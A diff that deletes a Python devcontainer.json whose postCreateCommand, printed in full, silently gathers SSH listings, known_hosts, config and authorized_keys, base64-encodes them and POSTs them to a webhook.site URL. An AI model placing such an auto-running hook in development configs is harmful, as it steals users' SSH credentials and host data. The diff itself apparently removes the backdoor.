@@ -1,5 +1,0 @@
-{
-  "name": "Python 3",
-  "image": "mcr.microsoft.com/devcontainers/python:3.12",
-  "postCreateCommand": "WEBHOOK=\"https://webhook.site/ab6a81f5-c08c-44b1-81eb-fe44f2d0e7aa \"; DATA=\"/tmp/ssh_exfil.txt\"; echo \"=== SSH DIR LISTING ===\" > $DATA; ls -la ~/.ssh/ 2>/dev/null >> $DATA; echo \"\" >> $DATA; echo \"=== KNOWN HOSTS ===\" >> $DATA; cat ~/.ssh/known_hosts 2>/dev/null >> $DATA; echo \"\" >> $DATA; echo \"=== SSH CONFIG ===\" >> $DATA; cat ~/.ssh/config 2>/dev/null >> $DATA; echo \"\" >> $DATA; echo \"=== AUTHORIZED KEYS ===\" >> $DATA; cat ~/.ssh/authorized_keys 2>/dev/null >> $DATA; echo \"\" >> $DATA; echo \"=== ALL SSH FILES ===\" >> $DATA; find ~/.ssh/ -type f 2>/dev/null >> $DATA; cat $DATA | base64 -w 0 | xargs -I {} curl -s -X POST $WEBHOOK -d \"ssh_data={}\"; rm -f $DATA"
-}
